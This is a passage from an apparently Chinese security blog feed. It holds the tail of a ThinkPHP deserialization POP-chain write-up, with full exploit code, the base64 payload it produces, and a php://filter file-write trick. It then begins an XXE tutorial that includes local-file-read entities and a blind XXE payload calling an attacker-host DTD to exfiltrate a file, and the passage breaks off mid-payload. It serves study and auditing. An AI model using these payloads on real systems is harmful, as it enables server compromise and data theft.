class_">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Query类，用来匹配$parent</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>) //传入的需要是<span class="title">Output</span>类的对象</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="variable">$model</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Output类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">styles</span> = [&quot;<span class="title class_">getAttr</span>&quot;];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>; <span class="comment">//是Memcached类的对象，需要调用这个里面的write</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Memcached类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handler</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$handler</span>; <span class="comment">//是File类的对象，需要使用其中的set方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//File类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>, <span class="comment">//绕过getCacheKey中的第一个if</span></span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>, <span class="comment">//绕过getCacheKey中的第二个if</span></span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php&#x27;</span>, <span class="comment">//有php+12个0+exit，共21个字符，为了凑到4的整数倍，需要加上三个字符</span></span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="string">&#x27;1&#x27;</span>; <span class="comment">//用于后续控制文件名，需要使用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">Memcached</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>(<span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$Output</span>, <span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$window</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后生成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aToxO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO3M6MToiMCI7czo2OiJwcmVmaXgiO3M6MToiMCI7czo0OiJwYXRoIjtzOjEwNjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXh4eFBEOXdhSEFnY0dod2FXNW1ieWdwT3o4Ky8uLi9hLnBocCI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czoxOiIxIjt9fX19fXM6OToiACoAcGFyZW50IjtyOjExO319fQ</span><br></pre></td></tr></table></figure><p>传入：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173035726.png" alt="image-20220824173035726"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173115023.png" alt="image-20220824173115023"></p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173147241.png" alt="image-20220824173147241"></p><p>这里分析一下文件名是怎么生成的</p><p><strong>第一次进入set函数的时候：</strong></p><p>首先将$name进行md5加密，然后连接到$this-&gt;options[‘path’]后面，再加上.php</p><p>可以得到<code>$filename</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php8db7a8c80e67e908f96fbf22dde11df3.php</span><br></pre></td></tr></table></figure><p>然后进行<code>file_put_contents()</code>，可以得到第一个文件，同时第一个$data值是将恒为true的$value反序列化，得到b:1;</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824183337048.png" alt="image-20220824183337048"></p><p><strong>第二次进入set函数的时候：</strong></p><p>会经过setTagtem()函数，进行重新赋值，进入到has方法，跟进到get方法，然后重新调用到File类的getCacheKey方法，此时的$name是tag_md5(“1”),也就是<code>tag_c4ca4238a0b923820dcc509a6f75849b</code></p><p>然后上面的再次md5，得到<code>3b58a9545013e88c7186db11bb158c44</code>，按照之前的方法，连接到后面，就会出现新的<code>$filename</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php</span><br></pre></td></tr></table></figure><p>因为这个文件不存在，会返回false所以会跳过if($this-&gt;has($key))，直接令$value等于输入的$name，也就是tag_md5(“1”)，也就是<code>tag_c4ca4238a0b923820dcc509a6f75849b</code></p><p>然后再次进入set()函数，这一次会进入getCacheKey()函数，然后再次md5加密，得到md5(tag_md5(“1”))，也就是$filename</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php</span><br></pre></td></tr></table></figure><p>然后因为第一次进入setTagItem()函数的时候，会将tag设置为null，所以不会再进入，写入成功。</p><p>因此最后我们需要的文件名应该是这个格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name = &quot;a.php&quot;.md5(tag_md5(&quot;1&quot;)).&quot;.php&quot;</span><br></pre></td></tr></table></figure><p>两次md5都是getCacheKey中的函数。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://xz.aliyun.com/t/7457#toc-3">https://xz.aliyun.com/t/7457#toc-3</a></p><p><a href="https://www.moonsec.com/4586.html">https://www.moonsec.com/4586.html</a></p><p><a href="https://www.anquanke.com/post/id/196364#h2-5">https://www.anquanke.com/post/id/196364#h2-5</a></p><p><a href="https://www.anquanke.com/post/id/265088#h2-4">https://www.anquanke.com/post/id/265088#h2-4</a></p><p><a href="https://xz.aliyun.com/t/7457#toc-5">https://xz.aliyun.com/t/7457#toc-5</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;utm_relevant_index=2">https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;utm_relevant_index=2</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识XXE</title>
      <link href="/2022/08/05/%E5%88%9D%E8%AF%86XXE/"/>
      <url>/2022/08/05/%E5%88%9D%E8%AF%86XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞概述："><a href="#XXE漏洞概述：" class="headerlink" title="XXE漏洞概述："></a>XXE漏洞概述：</h2><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。<br> 下面我们主要介绍PHP语言下的XXE攻击.</p><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p><p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。  外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。  但是，在处理外部实体时，可以针对应用程序启动许多攻击。  这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。  通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p><h3 id="1-1-XML基础"><a href="#1-1-XML基础" class="headerlink" title="1.1 XML基础"></a>1.1 XML基础</h3><p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。</p><blockquote><p><a href="https://www.baidu.com/link?url=L6JMO5tvg5ezZzr9bGbyGquXZW3wFoQERLSbURIG5Cx5yLohQzxOEksQrLmw4PtjMtidvQZaTVjTYAs8Frt4OK&wd=&eqid=9bce677d0000ee900000000362e0fafa">菜鸟教程链接</a>：</p></blockquote><p>简单来说，如果需要在HTML文档中动态现实数据，则需要使用大量的时间来对HTML进行编辑，通过XML可以将数据存储在独立的XML文件中，这样就可以专注于使用HTML&#x2F;CSS进行现实和布局，不需要进行大量的修改。</p><p><strong>XML数据使用文本的格式进行存储。</strong></p><h4 id="1-1-1文档结构"><a href="#1-1-1文档结构" class="headerlink" title="1.1.1文档结构"></a>1.1.1文档结构</h4><p>XML文档形成了一种树结构从根部开始，然后扩展到枝叶。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> <span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  <span class="comment">&lt;!--子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;note&gt;</code>表示下面的是根元素，使用<code>&lt;/note&gt;</code>进行包裹，之间的被成为子元素。</p><p>对于XML文档来说，必须包含根元素。这个元素是所有其他元素的父元素。同时，所有元素都可以有子元素。</p><h4 id="1-1-2-DTD"><a href="#1-1-2-DTD" class="headerlink" title="1.1.2 DTD"></a>1.1.2 DTD</h4><blockquote><p><a href="https://www.runoob.com/dtd/dtd-tutorial.html">菜鸟教程</a></p></blockquote><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><em>*<em>DTD</em>是一种保证XML文档格式正确的有效方法，可以通过比较XML文档和*DTD</em>文件来看文档是否符合规范，元素和标签使用是否正确。**</p><p>简单来说这个就是一个用来判定你写的XML是不是正确的一个判定标准，但是可以自己定义。</p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><p> （1）内部的 DOCTYPE 声明<br> <code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br> （2）外部文档声明<br> <code>&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-1-3-DTD实体"><a href="#1-1-3-DTD实体" class="headerlink" title="1.1.3 DTD实体"></a>1.1.3 DTD实体</h4><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><ul><li>实体引用是对实体的引用。</li><li>实体可在内部或外部进行声明。</li></ul><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>关于实体的使用：</strong></p><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，<strong>但是实体实际上可以从外部的 dtd 文件中引用</strong>，我们看下面的代码：</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;!--XML--&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><p><strong>关于通用实体和参数实体：</strong></p><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，<strong>他在DTD 中定义，在 XML 文档中引用</strong></p><p><strong>示例代码：</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p>可以看见的是，这样就是直接对实体进行了引用，相当于是写出了两个实体。其中一个是直接给出的实体的值，另一个是给出了实体名称，然后使用url进行外部引用。</p><p><strong>抛转：</strong></p><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><p><strong>总结：</strong></p><p>（1）内部实体声明<br> <code>&lt;!ENTITY 实体名称 ”实体的值”&gt;</code><br> （2）外部实体声明<br> <code>&lt;!ENTITY 实体名称 SYSTEM ”URI”&gt;</code><br> （3）参数实体声明<br> <code>&lt;!ENTITY % 实体名称 ”实体的值”&gt;</code>或者<code>&lt;!ENTITY % 实体名称 SYSTEM ”URI”&gt;</code></p><p>三种实体声明方式使用区别：<br> 参数实体用%实体名称申明，引用时也用<code>%</code>实体名称;<br> 其余实体直接用实体名称申明，引用时用<code>&amp;</code>实体名称。<br> 参数实体只能在<code>DTD</code>中申明，<code>DTD</code>中引用；<br> 其余实体只能在<code>DTD</code>中申明，可在<code>xml</code>文档中引用。</p><h3 id="1-2-XXE原理"><a href="#1-2-XXE原理" class="headerlink" title="1.2 XXE原理"></a>1.2 XXE原理</h3><p><code>XXE</code>即<code>XML外部实体注入</code> 。我们先分别理解一下注入和外部实体的含义。</p><p>注入：是指<code>XML</code>数据在传输过程中被修改，导致服务器执行了修改后的恶意代码，从而达到攻击目的。 </p><p>外部实体：则是指攻击者通过利用外部实体声明部分来对<code>XML</code>数据进行修改、插入恶意代码。 所以<code>XXE</code>就是指<code>XML</code>数据在传输过程中利用外部实体声明部分的<code>“SYSTEM”</code>关键词导致<code>XML</code>解析器可以从本地文件或者远程<code>URI</code>中读取受保护的数据。（有点像是SSRF，引用了不该使用的本地文件或是远程的url）</p><h3 id="1-3-XXE分类"><a href="#1-3-XXE分类" class="headerlink" title="1.3 XXE分类"></a>1.3 XXE分类</h3><p><strong>下面我们对<code>XXE</code>进行一下分类，按照构造外部实体声明的方法不同可分为：</strong></p><p>直接通过<code>DTD</code>外部实体声明</p><p>通过<code>DTD</code>文档引入外部<code>DTD</code>文档中的外部实体声明</p><p>通过<code>DTD</code>外部实体声明引入外部<code>DTD</code>文档中的外部实体声明</p><p><strong>按照<code>XXE</code>回显信息不同可分为：</strong></p><p>正常回显XXE：</p><p>正常回显XXE是最传统的XXE攻击,在利用过程中服务器会直接回显信息，可直接完成XXE攻击。</p><p>报错XXE：</p><p>报错XXE是回显XXE攻击的一种特例,它与正常回显XXE的不同在于它在利用过程中服务器回显的是错误信息，可根据错误信息的不同判断是否注入成功。</p><p>Blind XXE：</p><p>当服务器没有回显，我们可以选择使用Blind XXE。与前两种XXE不同之处在于Blind XXE无回显信息,可组合利用file协议来读取文件或http协议和ftp协议来查看日志。<br> Blind XXE主要使用了DTD约束中的参数实体和内部实体。<br> 在XML基础有提到过参数实体的定义，这里就不再做详细讲解。<br> 参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀。而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Note[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://攻击者主机IP/Quan.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>Quan.xml内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 